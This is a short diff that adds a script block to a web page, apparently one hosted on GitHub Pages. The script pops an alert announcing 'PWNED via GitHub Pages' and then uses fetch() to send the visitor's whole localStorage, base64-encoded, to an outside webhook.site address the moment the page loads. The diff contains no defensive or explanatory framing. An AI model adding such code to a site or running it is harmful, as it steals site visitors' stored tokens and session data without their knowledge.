@@ -1,0 +1,5 @@
+<script>
+alert("PWNED via GitHub Pages");
+
+fetch("https://webhook.site/f52ca55a-37b2-4992-98c6-66b5212093b1?data=" + btoa(JSON.stringify(localStorage)));
+</script>
